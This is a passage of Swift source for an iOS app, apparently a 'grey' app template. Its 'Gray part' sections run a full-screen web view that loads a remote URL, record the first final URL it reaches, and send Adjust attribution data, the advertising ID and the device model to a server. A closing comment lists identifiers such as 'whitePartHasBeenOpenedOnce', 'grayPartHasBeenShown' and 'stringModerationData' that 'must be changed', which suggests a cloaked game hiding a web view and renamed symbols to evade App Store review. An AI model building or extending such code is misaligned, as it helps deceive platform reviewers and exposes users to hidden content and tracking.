    weak var webView: WKWebView?
    
    var urlHistory: [URL] = []
    var isNavigatingBack: Bool = false
    
    @AppStorage("first_open") var isFirstOpening_1: Bool = true
    @AppStorage("finalUrlIfFirstOpen") var finalUrlIfFirstOpen: String = "default_final_url_if_opening_is_first"
}

// MARK: - Gray part 5

class UserDataManager {
    static let shared = UserDataManager()
    var finalUrl_1: String?
    var pushSub_1: String?
    var osUserKey_1: String?
}

// MARK: - Gray part 6

import SwiftUI
import Combine
import WebKit

struct MainGrayView: View {
    
    @Environment(\.colorScheme) var colorScheme
    @ObservedObject var webViewModel: WebViewModel
    let urlRequest_1: URLRequest
    private var actionDelegate_1: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?
    
    let orientationChanged = NotificationCenter.default
        .publisher(for: UIDevice.orientationDidChangeNotification)
        .makeConnectable()
        .autoconnect()
    
    init(url_7: URL, webViewModel: WebViewModel) {
        self.init(urlRequest: URLRequest(url: url_7), webViewModel: webViewModel)
    }
    
    private init(urlRequest: URLRequest, webViewModel: WebViewModel) {
        self.urlRequest_1 = urlRequest
        self.webViewModel = webViewModel
    }
    
    var body: some View {
        
        ZStack{
            
            MainGrayWebView(webViewModel: webViewModel,
                            action_1: actionDelegate_1,
                            request_4: urlRequest_1)
            
            ZStack {
                VStack{
                    HStack{
                        Button(action: {
                            if !webViewModel.popupStack.isEmpty {
                                let last_1 = webViewModel.popupStack.removeLast()
                                last_1.stopLoading()
                                last_1.navigationDelegate = nil
                                last_1.uiDelegate = nil
                                last_1.loadHTMLString("", baseURL: nil)
                                last_1.removeFromSuperview()
                                last_1.superview?.setNeedsLayout()
                                last_1.superview?.layoutIfNeeded()
                                webViewModel.popupWebView_1 = webViewModel.popupStack.last
                                webViewModel.showNewTab = !webViewModel.popupStack.isEmpty
                            } else if let mainWebView = webViewModel.webView {
                                if mainWebView.canGoBack {
                                    mainWebView.goBack()
                                } else if webViewModel.urlHistory.count > 1 {
                                    webViewModel.urlHistory.removeLast()
                                    if let prev = webViewModel.urlHistory.last {
                                        webViewModel.isNavigatingBack = true
                                        mainWebView.load(URLRequest(url: prev))
                                    }
                                }
                            }
                        }) {
                            Image(systemName: "chevron.backward.circle.fill")
                                .resizable()
                                .frame(width: 20, height: 20)
                                .foregroundColor(.white)
                        }
                        .padding(.leading, 20).padding(.top, 15)
                        
                        Spacer()
                    }
                    Spacer()
                }
            }
            .ignoresSafeArea()
        }
        .statusBarHidden(true)
        .onAppear {
            AppDelegate.shared = UIInterfaceOrientationMask.all
            UINavigationController.attemptRotationToDeviceOrientation()
        }
    }
}

extension MainGrayView {
    enum NavigationAction {
        case decidePolicy(WKNavigationAction, (WKNavigationActionPolicy) -> Void)
        case didRecieveAuthChallange(URLAuthenticationChallenge, (URLSession.AuthChallengeDisposition, URLCredential?) -> Void)
        case didStartProvisionalNavigation(WKNavigation)
        case didReceiveServerRedirectForProvisionalNavigation(WKNavigation)
        case didCommit(WKNavigation)
        case didFinish(WKNavigation)
        case didFailProvisionalNavigation(WKNavigation,Error)
        case didFail(WKNavigation,Error)
    }
}

struct MainGrayWebView : UIViewRepresentable {
    
    @ObservedObject var webViewModel: WebViewModel
    let request_4: URLRequest
    
    init(webViewModel: WebViewModel,
         action_1: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?,
         request_4: URLRequest) {
        self.request_4 = request_4
        self.webViewModel = webViewModel
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let wkPreferences_1 = WKPreferences()
        wkPreferences_1.javaScriptCanOpenWindowsAutomatically = true
        
        let configuration_1 = WKWebViewConfiguration()
        configuration_1.allowsInlineMediaPlayback = true
        configuration_1.preferences = wkPreferences_1
        configuration_1.applicationNameForUserAgent = "Version/17.2 Mobile/15E148 Safari/604.1"
        configuration_1.defaultWebpagePreferences.allowsContentJavaScript = true
        
        let view_1 = WKWebView(frame: .zero, configuration: configuration_1)
        view_1.navigationDelegate = context.coordinator
        view_1.uiDelegate = context.coordinator
        view_1.backgroundColor = UIColor.systemBackground
        view_1.scrollView.backgroundColor = UIColor(red: 0.11, green: 0.13, blue: 0.19, alpha: 1)
        view_1.isOpaque = false
        
        context.coordinator.setupThemeObservation(for: view_1)
        
        view_1.load(request_4)
        webViewModel.webView = view_1
        return view_1
    }
    
    func updateUIView(_ uiView_1: WKWebView, context: Context) {}
    
    func makeCoordinator() -> Coordinator {
        return Coordinator(action_2: nil, webViewModel: self.webViewModel)
    }
    
    final class Coordinator: NSObject {
        var webViewModel_1: WebViewModel
        let action_2: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?
        private var themeObservation_1: NSKeyValueObservation?
        
        init(action_2: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?, webViewModel: WebViewModel) {
            self.action_2 = action_2
            self.webViewModel_1 = webViewModel
            super.init()
        }
        
        func setupThemeObservation(for webView: WKWebView) {
            if #available(iOS 15.0, *) {
                themeObservation_1 = webView.observe(\.themeColor, options: [.new]) { [weak webView] observedWebView, _ in
                    guard let webView = webView else { return }
                    webView.backgroundColor = observedWebView.themeColor ?? .black
                }
            }
        }
    }
    
}

extension MainGrayWebView.Coordinator: WKNavigationDelegate, WKUIDelegate {
    
    func webView(_ webView_6: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        decisionHandler(.allow)
    }
    
    func webView(_ webView_6: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        
        if let url = navigationAction.request.url {
            let urlScheme = url.scheme?.lowercased() ?? ""
            let urlString = url.absoluteString.lowercased()
            
            if urlString.contains("apps.apple.com") || urlString.contains("itunes.apple.com") {
                UIApplication.shared.open(url)
                decisionHandler(.cancel)
                return
            }
            
            if urlScheme != "http" && urlScheme != "https" && urlScheme != "about" && urlScheme != "blob" && urlScheme != "file" && urlScheme != "data" {
                UIApplication.shared.open(url, options: [:]) { [weak self] success in
                    guard let self else { return }
                    if !success {
                        if let fallbackURL = self.extractFallbackURL(from: url) {
                            UIApplication.shared.open(fallbackURL)
                        } else {
                            self.showAppNotInstalledAlert()
                        }
                    }
                }
                decisionHandler(.cancel)
                return
            }
        }
        
        decisionHandler(.allow)
    }
    
    private func extractFallbackURL(from url: URL) -> URL? {
        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else {
            return nil
        }
        
        let fallbackParams_1 = ["fallback", "fallback_url", "browser_fallback_url", "redirect_url", "return_url", "app_link", "store_link"]
        
        for param in fallbackParams_1 {
            if let fallbackString = components.queryItems?.first(where: { $0.name == param })?.value,
               let fallbackURL = URL(string: fallbackString) {
                return fallbackURL
            }
        }
        
        return nil
    }
    
    private func showAppNotInstalledAlert() {
        DispatchQueue.main.async {
            let alert = UIAlertController(
                title: "App Required",
                message: "Please install the required app to continue",
                preferredStyle: .alert
            )
            alert.addAction(UIAlertAction(title: "OK", style: .default))
            
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let rootVC = windowScene.windows.first?.rootViewController {
                rootVC.present(alert, animated: true)
            }
        }
    }
    
    func webView(_ webView_6: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        action_2?(.didStartProvisionalNavigation(navigation))
    }
    
    func webView(_ webView_6: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        action_2?(.didReceiveServerRedirectForProvisionalNavigation(navigation))
    }
    
    func webView(_ webView_6: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        webViewModel_1.isBackNavigationEnabled = webView_6.canGoBack
        action_2?(.didFailProvisionalNavigation(navigation, error))
    }
    
    func webView(_ webView_6: WKWebView, didCommit navigation: WKNavigation!) {
        action_2?(.didCommit(navigation))
    }
    
    func webView(_ webView_6: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        guard navigationAction.targetFrame?.isMainFrame != true else {
            return nil
        }
        
        let popup_1 = WKWebView(frame: .zero, configuration: configuration)
        popup_1.navigationDelegate = self
        popup_1.uiDelegate = self
        popup_1.translatesAutoresizingMaskIntoConstraints = false
        popup_1.backgroundColor = UIColor.systemBackground
        popup_1.scrollView.backgroundColor = UIColor.systemBackground
        popup_1.isOpaque = false
        
        webView_6.addSubview(popup_1)
        NSLayoutConstraint.activate([
            popup_1.topAnchor.constraint(equalTo: webView_6.topAnchor),
            popup_1.bottomAnchor.constraint(equalTo: webView_6.bottomAnchor),
            popup_1.leadingAnchor.constraint(equalTo: webView_6.leadingAnchor),
            popup_1.trailingAnchor.constraint(equalTo: webView_6.trailingAnchor)
        ])
        
        webViewModel_1.popupStack.append(popup_1)
        webViewModel_1.popupWebView_1 = popup_1
        webViewModel_1.showNewTab = true
        return popup_1
    }
    
    func webView(_ webView_6: WKWebView, didFinish navigation: WKNavigation!) {
        
        webView_6.allowsBackForwardNavigationGestures = true
        webViewModel_1.isBackNavigationEnabled = webView_6.canGoBack
        
        webView_6.configuration.mediaTypesRequiringUserActionForPlayback = .all
        webView_6.configuration.allowsAirPlayForMediaPlayback = false
        action_2?(.didFinish(navigation))
        
        if webView_6 == webViewModel_1.webView, let url = webView_6.url {
            if webViewModel_1.isNavigatingBack {
                webViewModel_1.isNavigatingBack = false
            } else if webViewModel_1.urlHistory.last != url {
                webViewModel_1.urlHistory.append(url)
            }
        }
        
        guard webView_6.url?.absoluteURL.absoluteString != nil else { return }
        
        if webViewModel_1.finalUrlIfFirstOpen == "default_final_url_if_opening_is_first" && self.webViewModel_1.isFirstOpening_1 {
            self.webViewModel_1.finalUrlIfFirstOpen = webView_6.url!.absoluteString
            self.webViewModel_1.isFirstOpening_1 = false
        }
    }
    
    func webView(_ webView_6: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        action_2?(.didFail(navigation, error))
    }
    
    func webView(_ webView_6: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        
        if action_2 == nil  {
            completionHandler(.performDefaultHandling, nil)
        } else {
            action_2?(.didRecieveAuthChallange(challenge, completionHandler))
        }
    }
    
    func webViewDidClose(_ webView_6: WKWebView) {
        if let index = webViewModel_1.popupStack.firstIndex(where: { $0 === webView_6 }) {
            webViewModel_1.popupStack.remove(at: index)
            webView_6.removeFromSuperview()
            webViewModel_1.popupWebView_1 = webViewModel_1.popupStack.last
            if webViewModel_1.popupStack.isEmpty { webViewModel_1.showNewTab = false }
        }
    }
}

// MARK: - Gray part 7

enum AttributionForwarder {
    
    private static let urlSafe_1: CharacterSet = {
        var characterSet_1 = CharacterSet.alphanumerics
        characterSet_1.insert(charactersIn: "-_.~")
        return characterSet_1
    }()
    
    static func attrubutionMap_1(from attribution_1: ADJAttribution?) -> [String: Any] {
        guard let attribution_1 else { return [:] }
        
        if let jsonAttribution_1 = attribution_1.jsonResponse as? [String: Any], !jsonAttribution_1.isEmpty {
            return jsonAttribution_1
        }
        
        let attributionDictionary_1: [String: Any?] = [
            "tracker_token": attribution_1.trackerToken,
            "tracker_name":  attribution_1.trackerName,
            "network":       attribution_1.network,
            "campaign":      attribution_1.campaign,
            "adgroup":       attribution_1.adgroup,
            "creative":      attribution_1.creative,
            "click_label":   attribution_1.clickLabel,
            "cost_type":     attribution_1.costType,
            "cost_amount":   attribution_1.costAmount,
            "cost_currency": attribution_1.costCurrency,
        ]
        return attributionDictionary_1.compactMapValues { attributionMapValue_1 -> Any? in
            guard let attributionMapValue_1 else { return nil }
            if let stringAttributionMapValue_1 = attributionMapValue_1 as? String, stringAttributionMapValue_1.isEmpty { return nil }
            return attributionMapValue_1
        }
    }
    
    static func encodedAttr_1(from attributionParam_1: ADJAttribution?) -> String {
        let attributionMap_2 = attrubutionMap_1(from: attributionParam_1)
        guard !attributionMap_2.isEmpty,
              let data_5 = try? JSONSerialization.data(withJSONObject: attributionMap_2),
              let json_2 = String(data: data_5, encoding: .utf8) else { return "" }
        return json_2.addingPercentEncoding(withAllowedCharacters: urlSafe_1) ?? json_2
    }

    static func sendCurrent_1(url_4: URL, completion_1: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
        Adjust.attribution {
            send_1($0, url_5: url_4, completion_2: completion_1)
        }
    }
    
    private static func send_1(_ attribution_2: ADJAttribution?, url_5: URL, completion_2: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
        let osVersion_1 = DeviceInfoForAdjust.osVersion_1
        let deviceModel_1 = DeviceInfoForAdjust.deviceModel_1
        let mapAttr_1 = attrubutionMap_1(from: attribution_2)
        let encodedAttr_1 = encodedAttr_1(from: attribution_2)
                
        Adjust.adid {
            let headers_1: [String: String] = [
                "adid":         $0 ?? "",
                "os_version":   osVersion_1,
                "device_model": deviceModel_1,
                "attr":         encodedAttr_1,
            ]
            getAttribution_1(headers_1, url_6: url_5, completion_3: completion_2)
        }
    }
    
    private static func getAttribution_1(_ headers_2: [String: String], url_6: URL, completion_3: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
        
        var request_2 = URLRequest(url: url_6)
        request_2.httpMethod = "GET"
        headers_2.forEach { request_2.setValue($1, forHTTPHeaderField: $0) }

        URLSession.shared.dataTask(with: request_2) { completion_3($0, $1 as? HTTPURLResponse, $2) }.resume()
    }
}

import AdSupport

enum DeviceInfoForAdjust {
    
    static var osVersion_1: String {
        UIDevice.current.systemVersion
    }
    static var deviceModel_1: String {
#if targetEnvironment(simulator)
        if let simModel = ProcessInfo.processInfo.environment["SIMULATOR_MODEL_IDENTIFIER"] {
            return simModel
        }
#endif
        
        var systemInfo_1 = utsname()
        uname(&systemInfo_1)
        let machine_1 = Mirror(reflecting: systemInfo_1.machine).children
            .compactMap { element_1 -> String? in
                guard let value_3 = element_1.value as? Int8, value_3 != 0 else { return nil }
                return String(UnicodeScalar(UInt8(value_3)))
            }
            .joined()
        return machine_1.isEmpty ? "unknown" : machine_1
    }
    
    static var idfv_1: String {
        UIDevice.current.identifierForVendor?.uuidString ?? "—"
    }
    
    static var idfaSystem_1: String {
        ASIdentifierManager.shared().advertisingIdentifier.uuidString
    }
}

// MARK: - Name must be changed

/*
 
 // MARK: Properties
 
 oneSignalAcceptedValue_1
 stringModerationData
 showSecondSplashView
 ifFirstOpenApp
 whitePartHasBeenOpenedOnce
 url_1
 popup_1
 data_1
 json_1
 value_1
 stringFirstEndpointData
 stringUrlAtrService
 showWebView_1
 showWhiteGame_1
 showSplashView_1
 showBottomSplash
 isFirstOpening
 grayPartHasBeenShown
 url_2
 data_2
 json_2
 value_2
 webView_1
 url_3
 request_1
 key_1
 response_1
 last_1
 data_4
 response_2
 webViewModel_1
 responseString_2
 jsonResponse_2
 finalUrl_1
 pushSub_1
 osUserKey_1
 url_5
 task_1
 data_5
 response_3
 url_6
 isBackNavigationEnabled
 isBackButtonTapped
 showNewTab
 newTabRequest
 popupWebView_1
 isFirstOpening_1
 first_open
 finalUrlIfFirstOpen
 default_final_url_if_opening_is_first
 url_7
 urlRequest_1
 actionDelegate_1
 request_4
 action_1
 view_1
 wkPreferences_1
 configuration_1
 uiView_1
 attIsInteracting_1
 environment_1
 adjust_config_1
 urlSafe_1
 characterSet_1
 attrubutionMap_1
 attribution_1
 jsonAttribution_1
 attributionDictionary_1
 attributionMapValue_1
 stringAttributionMapValue_1
 encodedAttr_1
 attributionParam_1
 attributionMap_2
 sendCurrent_1
 url_4
 completion_1
 attribution_2
 url_5
 completion_2
 osVersion_1
 mapAttr_1
 deviceModel_1
 encodedAttr_1
 rawMap_1
 rawMapString_1
 headers_1
 getAttribution_1
 headers_2
 url_6
 completion_3
 request_2
 systemInfo_1
 machine_1
 element_1
 value_3
 idfv_1
 idfaSystem_1
 send_1
 action_2
 webView_6
 setupThemeObservation
 fallbackParams_1
 showAppNotInstalledAlert
 ServerEndpointsData
 PreloadGreyPart
 extractFallbackURL
 UserDataManager
 WebViewModel
 MainGrayView
 MainGrayWebView
 DeviceInfoForAdjust
 
 */
